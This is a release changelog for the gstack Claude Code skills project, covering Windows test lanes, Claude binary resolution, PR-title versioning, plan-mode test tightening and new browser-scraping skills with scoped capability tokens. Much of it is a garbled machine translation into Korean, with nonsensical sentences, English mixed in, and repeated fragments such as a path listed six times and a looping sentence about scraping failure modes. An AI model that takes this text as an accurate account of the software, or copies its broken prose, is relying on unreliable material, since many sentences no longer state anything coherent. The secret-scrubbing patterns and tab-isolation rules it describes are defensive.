**Windows는 진짜 차선입니다.** A `windows-free-tests` GitHub 동작 작업은 `windows-latest`에 103개의 큐레이트 테스트를 실행하고 Claude 해결자 테스트를 수행한다. 커멘션 스크립트 (`scripts/test-free-shards.ts --windows-only`)는 `/bin/bash`, `sh -c`, 또는 `/tmp/` 경로가 하드코드 `/bin/bash`, `sh -c`, 또는 `/tmp/` 경로가 있는 테스트를 제외한다. 그 예외는 TODO (현재 TODO)와 Windows (>)의 간격이 필요하다는 것을 제외한다. TODO PowerShell 지원은 `AGENTS.md`에서 명시적으로 이름을 붙인 미래 확장입니다. No "모든 녹색" 과소 평가 - 헤드 라인은 "curated Windows lane"라고 말합니다. 이 릴리스는 무엇을 전달하는지.

**claude 바이너리를 상속합니다.** `GSTACK_CLAUDE_BIN=wsl` plus `GSTACK_CLAUDE_BIN_ARGS='["claude"]'` 와 gstack 는 WSL 를 통해 사이트 노선 Claude 를 설정합니다. 3개의 공유 해결책 층 - 플랫폼 취급을 위한 `Bun.which()`, override + arg-prefix 논리를 위한 얇은 래퍼, 그리고 5개의 유선 경감 외침 위치는 - “Mac에 있는 삽화를 삭제하고, 안전 분류기를 위한 Windows” 실패 형태, 전광 검사 에이전트, SDK 및 LLM를 위한 실패를 삭제합니다.

**포크 루프는 읽습니다.** McGluut는 PR 상류를 뽑지 않고 실제 경화 작업의 3개의 커밋을 발송했습니다. 우리는 그것을 읽고, 엔지니어링을 유지하고, 프롬싱을 떨어뜨리고 신용이 이루어지는 것을 신용했습니다. 미래 포크: 기여 경로는 `git remote add` + PR; 우리가 거기에서 무슨을 읽는 증거입니다.

### 항목화 된 변경

#### 추가

- `bin/gstack-paths`: `GSTACK_STATE_ROOT`, `PLAN_ROOT`, `TMP_ROOT`를 명시적인 가을에 사슬로 결심하는 bash 돕er. `eval "$(~/.claude/skills/gstack/bin/gstack-paths)"`를 통해 sourced. 명예 `GSTACK_HOME` → `CLAUDE_PLUGIN_DATA` → `$HOME/.gstack` → `.gstack`; `GSTACK_PLAN_DIR` → `CLAUDE_PLANS_DIR` → `$HOME/.claude/plans` → `.claude/plans`; `TMPDIR` → `TMP` → `.gstack/tmp` `bin/gstack-codex-probe`; `bin/gstack-codex-probe`; `bin/gstack-codex-probe`; `bin/gstack-codex-probe`; `bin/gstack-codex-probe`; `bin/gstack-codex-probe`;
- `browse/src/claude-bin.ts`: 얇은 (~70 LOC)는 `Bun.which()`를 가로 뽑는 횡단형 `claude` 이진 해결책에 관하여 감싸는. 명예 `GSTACK_CLAUDE_BIN`/ `CLAUDE_BIN` env override (absolute 경로 또는 PATH-resolvable), 그리고 `GSTACK_CLAUDE_BIN_ARGS`/`CLAUDE_BIN_ARGS` arg-prefix (JSON 배열 또는 사기그릇)를 붙입니다. 과속값은 `Bun.which()`를 위해 LOC를 위해 수정합니다.
- `scripts/test-free-shards.ts`: 자유로운 시험 스위트를 enumerates, 안정되어 있는 해시 sharding (FNV-1a)를 지원하고, `--windows-only` 필터를 제공합니다 POSIX-bound 본 (`/bin/sh`, `sh -c`, 원시 `/tmp/`, `chmod`, `xargs`, `which claude`)를 위한 각 시험 내용 검사합니다. McGluut의 (190LOC)에 적응하는 Windows, `xargs`, `which claude`, `which claude`.
- `.github/workflows/windows-free-tests.yml`: `windows-latest`에서 `bun run test:windows`를 실행하는 별도의 비컨테이너 작업과 `browse/test/claude-bin.test.ts`와 `test/gstack-paths.test.ts`가 실행됩니다. NOT는 기존 Linux-container `evals.yml` (drop-in)에 있는 matrix 입장을 떨어뜨립니다.
- `test/gstack-paths.test.ts`: 3개의 낙하 사슬 (HOME unset, CLAUDE_PLUGIN_DATA set, GSTACK_HOME wins, 등을 덮는 8 단위 시험.).
- `browse/test/claude-bin.test.ts`: override-PATH-resolution case the fork's version got wrong.
- `test/test-free-shards.test.ts`: 14 단위는 enumeration, 유료 타원형 거르는, Windows 가연성 탐지 및 안정되어 있는 sharding를 덮는 시험합니다.
- `test/skill-validation.test.ts`: 3개의 새로운 invariant 시험 — 개인path 누출 발견자 (감시자 검사는 어떤 SKILL.md 또는 SKILL.md.tmpl에 있는 유지자 전용 파일에 근거를 둔다) 및 2개의 doc-inventory 십자가 검사 (각각각 기술적인 지시는 `AGENTS.md` 및 `docs/skills.md`에서 나타야 합니다).

#### 변경

- 11 SKILL.md.tmpl 파일은 인라인 `${CLAUDE_PLUGIN_DATA:-...}` 또는 `${GSTACK_HOME:-$HOME/.gstack}` 사슬 떨어져 migrated: `careful`, `freeze`, `guard`, `unfreeze`, `investigate`, `context-save`, `context-restore`, `learn`, `office-hours`, `plan-tune`, `codex`. 각 현재 근원 `bin/gstack-paths` 및 `$GSTACK_STATE_ROOT` (`$PLAN_ROOT`) 코드 `$TMP_ROOT`.
- `codex/SKILL.md.tmpl`: 새로운 단계 0.6 "휴대용 루트" 소스 `gstack-paths`. `"$PLAN_ROOT"/*.md` (3 위치)와 `mktemp /tmp/codex-*-XXXXXX.txt` (3 위치)와 `mktemp "$TMP_ROOT/codex-*-XXXXXX.txt"` (3 위치)를 가진 단단한coded `~/.claude/plans/*.md`를 대체하십시오. 기술 지금 Claude Code 플러그인은 수정 없이 설치합니다.
- `browse/src/security-classifier.ts`: `resolveClaudeCommand()`를 통해 `resolveClaudeCommand()`를 통해 2개의 단단한coded `spawn('claude', ...)` 호출 (버전 probe에: 396의 inference 호출에: 496)를 경로를 잇습니다. 명예 `GSTACK_CLAUDE_BIN` 과급; claude unavailable 때 확고하게.
- `scripts/preflight-agent-sdk.ts`: `resolveClaudeBinary()`를 가진 `execSync('which claude')`를 대체합니다. 교차 플랫폼, no 포탄 의존성.
- `test/helpers/providers/claude.ts`: `available()`와 `run()` 둘 다 `resolveClaudeCommand()`를 통해서 가십시오. 이전 `spawnSync('sh', ['-c', 'command -v claude'])`는 그것의 자신의 것에 Windows 차단제이었습니다.
- `test/helpers/agent-sdk-runner.ts`: `resolveClaudeBinary()` 이제 공유된 해결자에 위임합니다.
- `AGENTS.md`: 카테고리 (계획 리뷰, 구현, 출시, 운영, 브라우저, 안전)에 의해 조직 된 21 항목에서 기술 테이블을 다시로드합니다. `/debug` → `/investigate`. 이야기 `<5s` `bun test` 주장은 떨어졌다 - 주기적인 + 게이트 + 무료 계층과 함께 테스트 스위트 기간에 대해 만들기 위해 no 현실적 범용 주장이 있습니다.
- `docs/skills.md`: 재고표에 11개의 누락된 기술 추가 (`/plan-devex-review`, `/devex-review`, `/plan-tune`, `/context-save`, `/context-restore`, `/health`, `/landing-report`, `/benchmark-models`, `/pair-agent`, `/setup-gbrain`, `/make-pdf`).
- `package.json`: 2개의 새로운 스크립트. `test:free`는 sharding 스크립트를 통해 가득 차있는 자유로운 스위트를 실행합니다. `test:windows`는 curated Windows 안전 잠수함을 달립니다. 버전 범프 `1.15.0.0` → `1.24.0.0`.
- `VERSION`: `1.15.0.0` → `1.24.0.0`. Workspace-aware queue at /ship time: v1.16.0.0 claimed by `garrytan/gbrowser-unleashed` (PR #1253), v1.17.0.0 by `garrytan/setup-gbrain-run` (PR #1234), v1.19.0.0 by `garrytan/browserharness` (PR #1233), v1.21.1.0 by `garrytan/pty-plan-mode-e2e` (PR #1255). This branch claims the next available MINOR slot.

#### 고정

- `GSTACK_CLAUDE_BIN=wsl` (또는 PATH-resolvable 명령) 이제 실제로 바이너리를 해결합니다. McGluut 포크의 `claude-bin.ts`는 절대 경로의 무시만만 처리; bare 명령은 조용히 null을 반환합니다. Bun.which 기반 래퍼는 PATH 보기를 통해 과도하게 먹이고, 문서 사용 케이스를 고치십시오.
- `<5s` `bun test` `AGENTS.md`의 주장은 사라집니다. v1.15.0.0에서 슬림 골무 하네스와 새로운 테스트가 여기에 추가 된, 무료 스위트 런타임은 변화; no 현실적 유니버설은 만들려고 주장합니다.

#####는 TODOs (codex-flagged, 훼손)를 따릅니다

- **Merge-time 버전 슬롯 신선도 재 검사.** 현재 `bin/gstack-next-version` + `scripts/compare-pr-version.ts` 큐 보호는 PR 사건 접촉 버전 파일에 방아쇠를 답니다. 다른 PR 땅 AFTER 우리의 문 불이, 우리의 주장한 구멍은 자동적인 recheck 없이 stale를 갈 수 있습니다. P3 후속.
- **POSIX-바운드 테스트 표면 전체 Windows 패리티.** 25 시험은 `scripts/test-free-shards.ts`에서 `WINDOWS_FRAGILE_PATTERNS` 검사를 통해 curated Windows lane에서 제외됩니다. 구체적인 예: `test/ship-version-sync.test.ts:72` hardcodes `/bin/bash`, `test/helpers/providers/claude.ts:22` (현재 이 방출에서 조정), `package.json:12` 구조 단계 포탄 밖으로 `bash`/`chmod`. 이 항구는 "curated Windows lane"와 `package.json:12`를 따르는 전 틈입니다. P4 12/>
- **Native PowerShell 설정 지원.** `setup`는 `setup:404`에서 bash + symlink 무거운입니다. v1.24.0.0 문서 Git Bash/ MSYS는 지원되는 Windows로 `AGENTS.md`에 있는 경로 설치합니다. 기본 PowerShell 항구는 마지막 떨어져 shelf를 위해 Windows 간격을 닫습니다. P4 후속.

#### 기여자

- McGluut 포크에 적립되는 방향을 강하게 하기: <https://github.com/mcgluut/gstack>. 근거한 결산자는 `claude-bin.ts`에서 실행된 포크를 횡단 플랫폼 이진의 상승의 적응입니다; 경로 적합성 돕는 의 계수는 `${CLAUDE_PLUGIN_DATA:-...}` 사슬의 포크에 의하여 경사되는 per-skill. 큐레이터 Windows 테스트 작업은 `test-free-shards.ts`가 닿는 것의 상류의 독서이며, 해당 표면이 실제로 Windows-safe 오늘인지에 명시적 관심을 가져주고 있습니다.

## [1.23.0.0] - 2026-04-30

## **PR 제목은 `vX.Y.Z.W`로 시작합니다. `/ship`, `/document-release`, GitHub 모두 실행합니다.**

`/ship` 단계 19, 하지만 "자유한 사용자 정의 타이틀"로 지정된 형식은 버전 접두사없이 열었던 PR가 하나가 될 것임을 의미하지만 `/document-release`는 전혀 제목을 만지지 않았다. 그래서 doc-release VERSION 범퍼는 PR가 이전 버전에서 지적하지 않고 열었다. 이 릴리스는 모두 격차를 닫습니다. 이제 한 자리에 규칙은 (`bin/gstack-pr-title-rewrite.sh`), 3개의 쉘을 넣는 것 PR가 모두 쉘에 넣었습니다.

### 중요 한 숫자

깨끗한 나무에 `git diff --shortstat origin/main..HEAD`와 `bun test test/pr-title-rewrite.test.ts`에서 수 있습니다.

| Metric | Δ |
|---|---|
| Net branch 크기 대 주 | +210 / −36 라인 (5 파일 + 새로운 2) |
| 새로운 돕기 스크립트 | **bin/gstack-pr-title-rewrite.sh** (40 선, 진실의 단 하나 근원) |
| 새로운 단위 테스트 추가 | **+9** (test/pr-title-rewrite.test.ts) |
| Unit Suite 런타임 | **402ms의** (무료 계층, 각 push에서 실행) |
| 루프홀 닫기 | **3** (선 단계 19, 문서 릴리스 단계 9, pr-title-sync.yml) |
| 작성자는 PR에서 실행됩니다. | 플랜-eng-review (CLEARED) + adversarial (Claude 미시) |

### 이 빌더를 위한 뜻

PR titles are now a deterministic function of the VERSION file, no matter how the PR got created. Open one via the web UI with `feat: my thing` and the next push of a VERSION bump turns it into `v1.23.0.0 feat: my thing`. Run `/ship` from a stale branch where Step 12's queue-drift detection rebumps to a higher version and the title moves with it. Run `/document-release`, bump VERSION at Step 8, and the PR title now follows along instead of staying at the previous version.

돕는 자체는 종료 코드 2를 가진 VERSION 가치 (밖의 `^[0-9]+(\.[0-9]+)*$`)를 변형시켰습니다, bash의 본 매칭 `#` 통신수 (그래서 glob metacharacters를 포함하는 hypothetical VERSION는 침묵하게 mismatch를 포함하지 않습니다), 및 idempotent - 적용하는 그것 두번 산출이 동일한 결과를 산출할 수 없습니다.

### 항목화 된 변경

#### 추가

- `bin/gstack-pr-title-rewrite.sh`: 공유 헬퍼. `<NEW_VERSION>` + `<CURRENT_TITLE>`를 가지고, stdout에 정확한 제목을 인쇄하십시오. 3개의 케이스: 이미 정확합니다 (op), 다른 버전 접두사 (replace), no 접두사 (prepend). 유효하게 NEW_VERSION 입장에 모양. `/ship`, `/document-release` 및 GitHub 활동에 의해 사용하는.
- `test/pr-title-rewrite.test.ts`: 9개의 세련한 시험은 이미 정확한, 다른 접두사, 다른 접두사 길이, no-prefix, 보통 words-not-stripped, 단 하나 조각 stripped, 누락된 팔목, malformed-VERSION 거절 및 idempotence를 덮습니다. 자유로운 층은, 각 `bun test`에 달합니다.

#### 변경

- `ship/SKILL.md.tmpl` 단계 19: idempotency 블록은 이제 `v$NEW_VERSION` - no 더 많은 "custom title 지켰 의도적으로" 탈출 해치로 시작하는 제목을 항상 다시 작성합니다. 규칙에 `bin/gstack-pr-title-rewrite.sh`에 쉘. 편집이 스틱되지 않은 경우 제목과 retries를 다시 태우는 포스트 편집 자동 검사를 추가합니다.
- `ship/SKILL.md.tmpl` create-PR snippets (lines 867 and 876): 인라인 코멘트는 `v$NEW_VERSION` 필요조건을 때 단계 읽을 수 없는 합니다.
- `document-release/SKILL.md.tmpl` 단계 9: 새로운 "PR/MR 제목 동기화" 하위 단계는 신체 업데이트 후 동일한 돕기를 호출합니다. 단계 8 범퍼 VERSION 이후 `/ship`가 이미 PR를 생성 한 경우, 제목은 VERSION 대신 이동 stale.
- `.github/workflows/pr-title-sync.yml`: " 이미 접힌 경우에만 허용할 수 있는" 문을 삭제하십시오. 도움자, 각 VERSION 변화에 불조건으로 재쓰기. 기술 (manual `gh pr create`, 웹 UI) 외부를 열 PRs를 위한 방어적인 백스톱. `OLD_TITLE`를 위해 `env:`를 사용하십시오 그래서 YAML 표정 주입은 `run:`를 도달할 수 없습니다.

#### 기여자

- The helper is a regular `bin/` script with `set -euo pipefail`, no external deps beyond bash + sed. Slots into the existing pattern alongside `bin/gstack-config`, `bin/gstack-slug`, `bin/gstack-next-version`.
- 테스트 커버리지 게이트 이 — 규칙에 대한 모든 미래 변화는 테스트 고정장치 또는 스위트가 빨간색으로 업데이트해야합니다.

## [1.21.1.0] - 2026-04-28

## **계획 - 에이전트 연기가 조입니다. "에이전트은 단계 0을 건너 계획을 배웁니다"회복은 이제 문을 실패합니다.**

v1.15.0.0 real-PTY 하네스는 `'asked'` 또는 `'plan_ready'`를 성공으로 받아 들여지는 연기로 배송되었습니다. OR는 `/plan-ceo-review`를 위해 너무 찰흙이었습니다. 기술 템플릿은 0A premise 도전 플러스 단계 0F 형태 선택 BEFORE 어떤 계획 쓰기, 그래서 `plan_ready`를 첫째로 도달했습니다 IS 회귀. 이 릴리스는 `'asked'`의 연기를 위해 assertion를 `'asked'`, 그리고 PTY의 연기를 위해 연기하는 연기의 대신에, 이렇게 시험하는 연기의 대신에, 이렇게 시험합니다.

### 중요 한 숫자

깨끗한 나무에 `git diff --shortstat origin/main..HEAD`와 `bun test test/helpers/claude-pty-runner.unit.test.ts`에서 수 있습니다.

| Metric | Δ |
|---|---|
| Net branch 크기 대 주 | +162 / −65 선 (3 파일) |
| 새로운 단위 테스트 추가 | **+24** (claude-pty-runner.unit.test.ts) |
| Unit Suite 런타임 | **14ms의** (세로형, 자유층) |
| Real-PTY 게이트가 확인되었습니다. | **4 깨끗한 PTY 실행** (3개의 자물쇠에서 + 1개의 포스트 요인) |
| Outcome assertions 덮여 | **5/5** (가 3/5; `plan_ready`는 지금 FAIL 계획소를 위해) |
| 작성자는 PR에서 실행됩니다. | 플랜 - eng-review (CLEARED) + 코덱 상담 + 2 전문가 + 고문 |

### 이 빌더를 위한 뜻

하네스 회귀의 세 가지 새로운 클래스는 이제 $0.50 스탈리스틱 PTY 실행에 대기 중 무료 계층에서 치명적으로 드립니다. 클래스터는 순수 `classifyVisible()` 함수로 추출되어 오염 루프의 지점을 다시 주문하면 침묵 배송 대신 단위 테스트를 실패합니다. 권한이 부여 된 목록 (번호를 렌더링하는 목록)을 필터링하는 것은 `'asked'` 분류에서 허용된 것입니다. 허가는 0 단계로 간주 할 수 없습니다. bare 구문 `Do you want to proceed?` no는 더 긴 방아쇠 권한 탐지를 자체적으로 - 그것은 지금 파일 편집 컨텍스트 co-trigger를 필요로 합니다, 그래서 구문이 분류되지 않는 기술 질문.

`/plan-ceo-review`를 위해 특별히: 어떤 미래 preamble 호리호리한 아래로 또는 템플렛 편집은 에이전트을 건너뛰기 단계 0를 쓰고 계획은 PR 배의 앞에 문이 실패할 것입니다. 잡아당기기, 달리기 `bun test`는, 마구 층은 당신이 토큰을 보내는 없이 아마 더 단단합니다.

### 항목화 된 변경

#### 추가

- `test/helpers/claude-pty-runner.unit.test.ts`: `isPermissionDialogVisible` (새로운 공동 트리거 계약에), `isNumberedOptionListVisible`, `parseNumberedOptions`, 새로운 `classifyVisible()` 실행 시간 경로. 무료 계층, 각 `bun test`에 달합니다.
- `classifyVisible(visible)` in `claude-pty-runner.ts`: 순수 클래스터는 오염 루프에서 추출. `{ outcome, summary } | null`를 반환합니다. 지점 순서: Silent_쓰기 → 계획_ready → asked → null ( permission-dialog filter). 실시간 지점 (처리 종료, "Unknown command") 주자에 체류합니다.
- `TAIL_SCAN_BYTES = 1500`는 상수도에 수출했습니다. `runPlanSkillObservation`와 routing 시험의 nav 반복 사이 공유하여 sync에 있는 체재를 튜닝하십시오.
- `env?: Record<string, string>` 옵션 `runPlanSkillObservation`, `launchClaudePty`에 실을 꿰는. 미래 env 구동 시험 고립을 위한 배관 (gstack-config는 아직 명예 env overrides를 하지 않습니다; 포스트-merge 후속으로 추적해).

#### 변경

- `test/skill-e2e-plan-ceo-plan-mode.test.ts`: `['asked', 'plan_ready']`에서 `'asked'`에 좁히는 assertion. 꼬리 진단 선과 더불어 `outcome` (plan_대기 시간 대 침묵_write)에 현저한 메시지, 그리고 선 번호 대신 기술 템플렛 단면도 이름 (조정 편집에 달려 있는).
- `isPermissionDialogVisible`: bare `Do you want to proceed?`는 이제 파일 편집 컨텍스트가 필요합니다 (`Edit to <path>` 또는 `Write to <path>`). 다른 항목 (`requested permissions to`, `allow all edits`, `always allow access to`, `Bash command requires permission`)는 비조건적 유지.
- `test/skill-e2e-plan-ceo-mode-routing.test.ts`: 공유 `TAIL_SCAN_BYTES`를 가진 국부적으로 `1500` 마술 수를 대체합니다.

#### 기여자

- 주자 변화는 첨가물이고 기존하는 sibling 연기 (`plan-eng`, `plan-design`, `plan-devex`, `plan-mode-no-op`)는 그들의 느슨한 `['asked', 'plan_ready']` assertion를 지킵니다. 그들의 행동은 변하지 않습니다.
- `TODOS.md`: per-finding AskUserQuestion count assertion (V2), env-driven gstack-config overrides (그래서 시험이 됩니다), `SANCTIONED_WRITE_SUBSTRINGS`에 경화하는 경로 혼란을 옮기는 포스트 수위 후 후속.

## [1.20.0.0] - 2026-04-28

## **브라우저 - 스킬 토지. `/scrape <intent>` 첫 번째 호출은 페이지를 구동; 두 번째 호출은 200ms의 통합 스크립트를 실행합니다.**

Browser-skills are deterministic Playwright scripts that run as standalone Bun processes via `$B skill run`. They live in three storage tiers (project > global > bundled), get a per-spawn scoped capability token, and ship with `_lib/browse-client.ts` so each skill is fully self-contained. The bundled reference is `hackernews-frontpage` — try `$B skill run hackernews-frontpage` and you get the HN front page as JSON in 200ms.

에이전트는 그들을 승인. `/scrape <intent>`는 페이지 데이터를 끌어 당기는 단일 항목 포인트입니다. 그것은 처음 호출에 `triggers:` 배열을 통해 기존 기술을 일치하거나 `$B goto`/`$B html`/etc를 구동합니다. 브랜드 새로운 의도에 JSON를 반환합니다. 성공적인 프로토 타입 후, `/skillify`는 흐름을 조정합니다. it walks back through the conversation, extracts the final-attempt `$B` calls (no failed selectors, no chat fragments), synthesizes `script.ts` + `script.test.ts` + a captured fixture, stages everything to `~/.gstack/.tmp/skillify-<spawnId>/`, runs the test there, and asks before renaming into the final tier path. Test failure or rejection: `rm -rf` the temp dir, no half-written skill ever appears in `$B skill list`. Next `/scrape` with a matching intent routes via `$B skill list` + `$B skill run <name>`. ~30s 시제품은 ~200ms가 후속됩니다.

`/automate`를 묶는 교류는 다음 방출을 위해 P0로 추적됩니다. 긁는 것은 기술화 본 (실험 형태를 유효하게 하는 더 안전한 쐐기입니다: 잘못된 자료); mutating 활동은 `/automate`가 정상에 추가하는 단계 확인 문이 필요합니다.

아키텍처는 독립 Bun 프로세스로 *의외*를 실행하여 인-daemon 고립 문제를 측면. 각 스크립트는 per-spawn scoped 기능 token의 읽힌 명령 표면에 바인딩; daemon 루트 token는 마구를 결코 나타낸다. 두 token 정책은 동일한 레지스트리를 공유하지만 독립적으로 시행한다. `tabPolicy: 'shared'` (<9/>) (<9/>)은 스킬 탭의 범위와 같은 스킬 탭에 대한 접근 제한을 허용한다. 'own-only'` (pair-agent over the ngrok tunnel) is strict — the token can only access tabs it owns, must `newtab` 먼저 탭을 드라이브에 얻을 수 없으므로 사용자의 자연 탭에 도달 할 수 없습니다. 신뢰 경계는 daemon, 프로세스 사이드 env 스크럽에 없습니다.

### 지금 할 수있는 일

- **번들된 기술을 실행하십시오:** `$B skill run hackernews-frontpage` JSON를 반환합니다.
- **한 동사와 스크랩:** `/scrape latest hacker news stories`. 첫번째 호출은 `triggers:` 배열을 통해 번들된 기술을 일치하고 200ms에서 뛰기. 새로운 의도? 그것은 `$B`를 통해 시제품, 반환 JSON, 그리고 `/skillify`를 건의합니다.
- **프로토 타입:** `/skillify` 대화를 통해 다시 걸어가면, 마지막 `/scrape` 결과를 찾아서, 스크립트 + 테스트 + 고정장치를 합성하고, 임시 디디에 단계는 시험을 실행하고, `~/.gstack/browser-skills/<name>/`에 커밋하기 전에 물어줍니다.
- **어떤 것을 사용할 수 있습니다:** `$B skill list`는 3개의 층 (프로젝트 > 글로벌 > 번들)를 걸고 결심한 층 인라인을 인쇄합니다.
- **정착물에 대한 기술을 테스트:** `$B skill test hackernews-frontpage`는 캡처된 HTML snapshot, no 살아있는 네트워크에 대하여 번들 `script.test.ts`를 실행합니다.
- **기술 계약 읽기 :** `$B skill show hackernews-frontpage`는 SKILL.md를 인쇄합니다.
- **사용자 계층 기술 묘비:** `$B skill rm <name> [--global]`는 `.tombstones/<name>-<ts>/`로 이동합니다. 번들링된 기술은 읽기 전용입니다.

### 중요 한 숫자

출처: `browse/test/{skill-token,browse-client,browser-skills-storage,browser-skill-commands,browser-skill-write,tab-isolation,server-auth}.test.ts`, `browser-skills/hackernews-frontpage/script.test.ts`, `test/skill-validation.test.ts`의 맞은편에 155 단위 assertions. 더하기 5개의 문 층 E2E `test/skill-e2e-skillify.test.ts`에 있는 대들보. 2 초의 밑에 모든 자유로운 층 시험 통행; 문 층 E2E는 ~$5를 CI 뛰기 추가합니다.

| Surface | 의 특징 |
|---|---|
| 협의된 의도에 대한 지연 | ~200ms (초콜에 vs ~30s 시제품) |
| 새로운 `$B` 명령 | `skill` (5 subcommands: 목록, 쇼, 뛰기, 시험, rm) |
| 새로운 gstack 기술 | 2 (`/scrape`, `/skillify`); `/automate` TODOS에서 P0로 추적하는 |
| 새로운 모듈 | 5 (`browse-client.ts`, `browser-skills.ts`, `browser-skill-commands.ts`, `skill-token.ts`, `browser-skill-write.ts`) |
| 묶인 참조 기술 | 1 (`hackernews-frontpage`) |
| 저장 층 | 3 (프로젝트 > 글로벌 > 번들, 첫 번째 윈) |
| SDK 배포 모델 | sibling-file: 각 기술선 `_lib/browse-client.ts` (~3KB, 원뿔에 바이트 IDentical) |
| daemon사이드 기능 default | scoped 세션 token, `read+write`만 (no `eval`/`js`/`cookies`/`storage`) |
| 프로세스 측 env default | 스크럽: $HOME, $PATH 사용자 동정, TOKEN/KEY/SECRET, AWS_*, OPENAI_*, GITHUB_*, 등 일치하는 모든 것. |
| 탭 액세스 정책 | `'shared'` (살균) = 멸종, 범위만 문질러. `'own-only'` (쌍 시범) = 모든 읽기 + 쓰기에 대한 엄격한 소유권. |
| Atomic-write 계약 | `browse/src/browser-skill-write.ts`를 통해 임시 디디르 그 후에 이름을. 시험은 OR 승인 거부 = `rm -rf` 임시 디디르를 실패합니다. 디스크에 반 쓰기 기술이 결코. |

### 이 빌더를 위한 뜻

합성 루프가 닫힙니다. 처음에는 페이지를 긁는 에이전트를 요청하는 데 걸리며, 시제품 비용을 지불합니다. 동일한 의도 (반대로 또는 아닙니다)에 두 번째 시간, 그것은 200ms에서 응대 된 스크립트를 실행합니다. 모든 반복 데이터-풀 작업을 통해 곱하면, 릴리스 노트 스크랩, 리더 보드 체크, 대시보드 캡처 및 세션의 시간 절약 화합물을 볼 수 있습니다.

에이전트 사용 계약은 꽉: `/skillify`는 최종 사용 `$B` 대화에서 호출 (no 실패 선택자, no 채팅 파편은 on-disk artifact로 누출), 쓰기, 자동 생성 `script.test.ts` 거기, 그리고 테스트 패스에 커밋만 실행, 임시 직원 dir vanishes, no 끊어지다.

스크램핑의 실패 모드는 비결을 실행할 때, 스크램핑의 실패 모드가 비결되지 않는 한, 스크램핑의 실패 모드가 비결되지 않는 한, 스크램핑의 실패 모드가 비결되지 않는 경우, 스크램핑의 순서는 click 순서, 멀티 단계 자동화)의 선박을 채우는 것입니다. 스크램핑의 실패 모드는 benign (wrong data) 및 스트로테이션의 (unintended writes); 스크램핑의 실패 모드는 첫 번째 안전 패턴을 검증하는 기술입니다.

페어 에이전트 연산자는 이전에 가지고 있던 동일한 고립 보증을 얻을. 이중 감속기 터널 건축은 intact입니다: ngrok에 원격 에이전트은 국부적으로 사용자를 사용하고 있는 탭을 읽거나 쓸 수 없습니다. 터널 토큰은 `tabPolicy: 'own-only'`를, 해야 합니다 `newtab` 첫번째 탭을 몰기 위하여, 그리고 26 잡종 터널 allowlist만 도달합니다.

### 항목화 된 변경

#### 추가 — `$B skill` 실행 시간

- `$B skill list|show|run|test|rm <name?>`. Five subcommands. List walks 3 tiers (project > global > bundled) and prints the resolved tier inline so "why did it run that one?" is never a debugging mystery. Run mints a per-spawn scoped capability token, spawns `bun run script.ts -- <args>` with cwd locked to the skill dir, captures stdout (1MB cap) and stderr, and revokes the token on exit.
- `browse/src/browse-client.ts`. Canonical SDK (~250 LOC). env에서 `GSTACK_SKILL_TOKEN`를 읽으십시오 (`$B skill run`에 의해 놓이십시오), standalone debug를 위한 `<project>/.gstack/browse.json`로 뒤떨어졌습니다. Convenience 방법은 read+write 표면을 커버합니다: goto, click, fill, text, html, snapshot, 링크, 모양, 접근, 다른 유형, 기치, 스크린 샷, 대기압을 위해, 기다리십시오.
- `browse/src/browser-skills.ts`. 3 층 저장 도우미. `listBrowserSkills()` 워크스테이션 > 글로벌 > 번들 (첫번째 윈), 파스 SKILL.md frontmatter, no INDEX.json. `readBrowserSkill(name)`는 단일 이름과 동일합니다. `tombstoneBrowserSkill(name, tier)`는 회복성을 위해 `.tombstones/<name>-<ts>/`로 기술을 이동합니다.
- `browse/src/skill-token.ts`. `token-registry.createToken/revokeToken` 을 기술 별 클라이언트로 감싸고 있는 `skill:<name>:<spawn-id>` 를 읽습니다, 과태를 읽고, `tabPolicy: 'shared'` 를 읽으십시오. TTL = 의 종말 연산 시간 + 30s 슬랙.
- `browser-skills/hackernews-frontpage/`. 번들인 참조 기술 (SKILL.md, script.ts, _lib/browse-client.ts, fixture/hn-2026-04-26.html, script.test.ts). 가장 작은 재미있는 브라우저-스킬: 스크랩 HN 앞페이지, JSON, no auth, 안정 HTML로 30개의 이야기를 반환합니다.

#### 추가 — `/scrape` + `/skillify` gstack 기술

- `scrape/SKILL.md.tmpl` + generated `scrape/SKILL.md`. `/scrape <intent>` is one entry point with three paths: match (intent matches an existing skill's `triggers:` → `$B skill run <name>` in 200ms), prototype (drive `$B` primitives, return JSON, suggest `/skillify`), refusal (mutating intents route to `/automate`). Match decision lives in the agent, not the daemon, no new code in `browse/src/`, no expanded daemon command surface.
- `skillify/SKILL.md.tmpl` + generated `skillify/SKILL.md`. 11-step flow: provenance guard (walk back ≤10 turns for a bounded `/scrape` result, refuse if cold), name + tier + trigger proposal via `AskUserQuestion`, synthesize `script.ts` from final-attempt `$B` calls only, capture fixture, write `script.test.ts`, copy canonical SDK byte-identical to `_lib/browse-client.ts`, write SKILL.md frontmatter (`source: agent`, `trusted: false`), stage to temp dir, run `$B 기술 테스트`, 승인 게이트, 최종 계층 경로에 원자 이름을 변경합니다.
- `browse/src/browser-skill-write.ts`. 원자 씁니다 돕기. `stageSkill()`는 제한적인 펄스를 가진 `~/.gstack/.tmp/skillify-<spawnId>/<name>/`에 파일을 쓰. `commitSkill()`는 `realpath`/`lstat` 분야를 가진 마지막 층 경로로 원자 `fs.renameSync`를 합니다 (symlinked staging dirs를 따르는 것을 금지합니다, 복제하는 것을 거부합니다 기존하는 기술을 제외하십시오). `discardStaged()`는 시험 실패 승인 및 거절을 위한 정리 경로입니다. `rm -rf`는 `rm -rf` 당 `rm -rf`를 감싸고 있. `validateSkillName()`는 더 낮은 케이스 letters/digits/dashes만, no `..` 또는 경로 경감 문자를 적용합니다.

#### 트러스트 모델 — scoped 토큰

모든 spawn이드 기술은 자신의 scoped 토큰을 얻습니다. 모양:

- **기능 범위.** 읽기 + 쓰기 기본으로만 쓰기. No `eval`, `js`, `cookies`, `storage`. 단일 사용 clientId 인코딩 기술 이름 + 스파드 ID. 스파드 출구 또는 시간 아웃 (TTL = 타임 아웃 + 30s 슬랙) 때 레크리에이션.
- **프로세스 env.** `trusted: true` frontmatter passes `process.env` minus `GSTACK_TOKEN`. `trusted: false` (default) drops everything except a minimal allowlist (LANG, LC_ALL, TERM, TZ) and pattern-strips secrets (TOKEN/KEY/SECRET/PASSWORD/AWS_*/ANTHROPIC_*/OPENAI_*/GITHUB_*).
